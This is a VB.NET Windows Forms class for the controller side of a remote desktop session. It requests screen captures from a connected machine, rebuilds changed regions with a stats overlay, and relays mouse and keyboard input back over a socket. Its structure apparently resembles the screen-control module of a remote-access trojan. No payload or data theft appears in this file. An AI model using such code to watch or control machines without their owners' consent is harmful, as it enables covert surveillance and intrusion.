Imports System.Drawing.Drawing2D

Public Class Remote
    Public Sock As Integer
    Public Sz As Size
    Public F As Main
    Public active As Boolean = False
    Public filesize As String
    Public changes As String
    Public FPS As String = "??" ''todo: implement
    Public overlayarea As Bitmap
    Private Sub Remote_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

        For i As Integer = 0 To 13
            C1.Items.Add(QZ(i))
        Next
        For i As Integer = 1 To 10
            C2.Items.Add(i)
        Next
        P1.Image = New Bitmap(Sz.Width, Sz.Height)
        C1.SelectedIndex = 4
        C2.SelectedIndex = 4
        M.SelectedIndex = 0
        M.Enabled = False

        overlayarea = New Bitmap(Sz.Width, Sz.Height)
    End Sub

    Public Sub change()
        C1.Items.Clear()

        For i As Integer = 0 To 13
            C1.Items.Add(QZ(i))
        Next
        P1.Image = New Bitmap(Sz.Width, Sz.Height)
        C1.SelectedIndex = 4
        C2.SelectedIndex = 4

        overlayarea = New Bitmap(Sz.Width, Sz.Height)
    End Sub

    Public Sub PktToImage(ByVal BY As Byte())
        If active Then
            F.S.Send(Sock, Main.n.getscreen & Main.Sep & C1.SelectedIndex & Main.Sep & C2.Text & Main.Sep & C.Value)
        End If
        If op = Nothing Then
        Else
            If active Then
                If MouseCheckBox.Checked = True Then
                    Dim pp As New Point ''todo: get rid of initial mouse to top left corner
                    pp.X = op.X
                    pp.Y = op.Y
                    op = Nothing
                    F.S.Send(Sock, Main.n.mousemove & Main.Sep & pp.X & Main.Sep & pp.Y & Main.Sep)
                End If
            End If
        End If

        Dim B As Array = fx(BY, "^&^")
        Dim Q As New IO.MemoryStream(CType(B(1), Byte()))
        Dim L As Bitmap = Image.FromStream(Q)
        Dim QQ As String() = Split(BS(B(0)), ",")
        filesize = siz(BY.LongLength) ''add bytesize extension and pad with zeros
        If filesize.Contains(".") Then filesize = filesize.PadLeft(8, "0") Else filesize = filesize.PadLeft(7, "0") ''pad with zeros
        changes = QQ.Length - 2
        Dim K As Bitmap = P1.Image.GetThumbnailImage(CType(Split(QQ(0), ".")(0), Integer), CType(Split(QQ(0), ".")(1), Integer), Nothing, Nothing)
        Dim G As Graphics = Graphics.FromImage(K)
        If StatsCheckBox.Checked Then
            G.DrawImage(overlayarea, 0, 0) ''before everything, reset area with stat overlay
        End If
        Dim tp As Integer = 0
        For i As Integer = 1 To QQ.Length - 2
            Dim P As New Point(Split(QQ(i), ".")(0), Split(QQ(i), ".")(1))
            Dim SZ As New Size(L.Width, Split(QQ(i), ".")(2))
            G.DrawImage(L.Clone(New Rectangle(0, tp, L.Width, CType(Split(QQ(i), ".")(2), Integer)), L.PixelFormat), New Point(CType(Split(QQ(i), ".")(0), Integer), CType(Split(QQ(i), ".")(1), Integer)))
            If LinesCheckBox.Checked Then ''draw split lines
                Dim r As New Rectangle(Split(QQ(i), ".")(0), Split(QQ(i), ".")(1), SZ.Width, SZ.Height)
                If K.GetPixel(Split(QQ(i), ".")(0), Split(QQ(i), ".")(1)) = Color.Aquamarine Then
                    G.DrawRectangle(Pens.Blue, r)
                    MsgBox("") ''todo: improve
                Else
                    G.DrawRectangle(Pens.Aquamarine, r)
                End If
            End If
            tp += SZ.Height
        Next

        If StatsCheckBox.Checked Then ''draw fps
            Using gp As New GraphicsPath, f As New Font("Segoe UI", 12, FontStyle.Bold), p As New Pen(Brushes.Black, 2)
                gp.AddString(filesize, f.FontFamily, f.Style, f.Size + 3, New Point(2, 2), StringFormat.GenericTypographic)
                gp.AddString("Changes: " & changes, f.FontFamily, f.Style, f.Size + 3, New Point(2, 16), StringFormat.GenericTypographic)
                gp.AddString("FPS: " & FPS, f.FontFamily, f.Style, f.Size + 3, New Point(2, 30), StringFormat.GenericTypographic)
                overlayarea = K.Clone(New Rectangle(0, 0, gp.GetBounds.Width, gp.GetBounds.Height), overlayarea.PixelFormat) ''before drawing, back up area stats will be displayed on
                G.DrawPath(p, gp)
                G.FillPath(Brushes.Yellow, gp)
            End Using
        End If
        G.Dispose()
        P1.Image = K
    End Sub
    Function QZ(ByVal q As Integer) As Size '  Lower Size of image
        Dim zs As New Size(Sz)
        Select Case q
            Case 0
                Return Sz
            Case 1
                zs.Width = zs.Width / 1.1
                zs.Height = zs.Height / 1.1
            Case 2
                zs.Width = zs.Width / 1.3
                zs.Height = zs.Height / 1.3
            Case 3
                zs.Width = zs.Width / 1.5
                zs.Height = zs.Height / 1.5
            Case 4
                zs.Width = zs.Width / 1.9
                zs.Height = zs.Height / 1.9
            Case 5
                zs.Width = zs.Width / 2
                zs.Height = zs.Height / 2
            Case 6
                zs.Width = zs.Width / 2.1
                zs.Height = zs.Height / 2.1
            Case 7
                zs.Width = zs.Width / 2.2
                zs.Height = zs.Height / 2.2
            Case 8
                zs.Width = zs.Width / 2.5
                zs.Height = zs.Height / 2.5
            Case 9
                zs.Width = zs.Width / 3
                zs.Height = zs.Height / 3
            Case 10
                zs.Width = zs.Width / 3.5
                zs.Height = zs.Height / 3.5
            Case 11
                zs.Width = zs.Width / 4
                zs.Height = zs.Height / 4
            Case 12
                zs.Width = zs.Width / 5
                zs.Height = zs.Height / 5
            Case 13
                zs.Width = zs.Width / 6
                zs.Height = zs.Height / 6
        End Select
        zs.Width = Mid(zs.Width.ToString, 1, zs.Width.ToString.Length - 1) & 0
        zs.Height = Mid(zs.Height.ToString, 1, zs.Height.ToString.Length - 1) & 0
        Return zs
    End Function
    Private Sub Remote_KeyDown(sender As Object, e As KeyEventArgs) Handles MyBase.KeyDown ''key control
        Dim key As String
        If KeyboardCheckBox.Checked = True Then
            If e.Shift Then
                key = e.KeyCode.ToString.ToUpper
            Else
                key = e.KeyCode.ToString.ToLower
            End If
            F.S.Send(Sock, Main.n.keyboard & Main.Sep & key)
        End If
    End Sub
    Private Sub P1_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles P1.MouseDown
        If MouseCheckBox.Checked = True Then
            Dim PP = New Point(e.X * (Sz.Width / P1.Width), e.Y * (Sz.Height / P1.Height))
            Dim but As Integer
            If e.Button = Windows.Forms.MouseButtons.Left Then
                but = 2
            End If
            If e.Button = Windows.Forms.MouseButtons.Right Then
                but = 8
            End If
            F.S.Send(Sock, Main.n.mouseclick & Main.Sep & PP.X & Main.Sep & PP.Y & Main.Sep & but)
        End If
    End Sub
    Private Sub P1_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles P1.MouseUp
        If MouseCheckBox.Checked = True Then
            Dim PP = New Point(e.X * (Sz.Width / P1.Width), e.Y * (Sz.Height / P1.Height))
            Dim but As Integer
            If e.Button = Windows.Forms.MouseButtons.Left Then
                but = 4
            End If
            If e.Button = Windows.Forms.MouseButtons.Right Then
                but = 16
            End If
            F.S.Send(Sock, Main.n.mouseclick & Main.Sep & PP.X & Main.Sep & PP.Y & Main.Sep & but)
        End If

    End Sub
    Dim op As New Point(1, 1)
    Private Sub P1_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles P1.MouseMove
        If MouseCheckBox.Checked = True Then
            If active Then
                Dim PP = New Point(e.X * (Sz.Width / P1.Width), e.Y * (Sz.Height / P1.Height))
                If PP <> op Then
                    op = PP
                End If
            End If
        End If
    End Sub
    Private Sub ToggleButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToggleButton.Click
        If active = False Then
            M.Enabled = True
            ToggleButton.Text = "Stop"
            F.S.Send(Sock, Main.n.getscreen & Main.Sep & C1.SelectedIndex & Main.Sep & C2.Text & Main.Sep & C.Value)
            active = True
            ToggleButton.BackColor = Color.Red
        Else
            M.Enabled = False
            active = False
            ToggleButton.Text = "Start"
            ToggleButton.BackColor = Color.Green
        End If
    End Sub

    Private Sub FPSCheckBox_CheckedChanged(sender As Object, e As EventArgs) Handles StatsCheckBox.CheckedChanged
        If Not StatsCheckBox.Checked Then
            clear()
        End If
    End Sub

    Private Sub LinesCheckBox_CheckedChanged(sender As Object, e As EventArgs) Handles LinesCheckBox.CheckedChanged
        If Not LinesCheckBox.Checked Then
            clear()
        End If
    End Sub

    Sub clear()
        F.S.Send(Sock, Main.n.clearscreen)
    End Sub

    Private Sub M_SelectedIndexChanged(sender As Object, e As EventArgs) Handles M.SelectedIndexChanged
        F.S.Send(Sock, Main.n.changescreen & Main.Sep & M.SelectedIndex)
    End Sub
End Class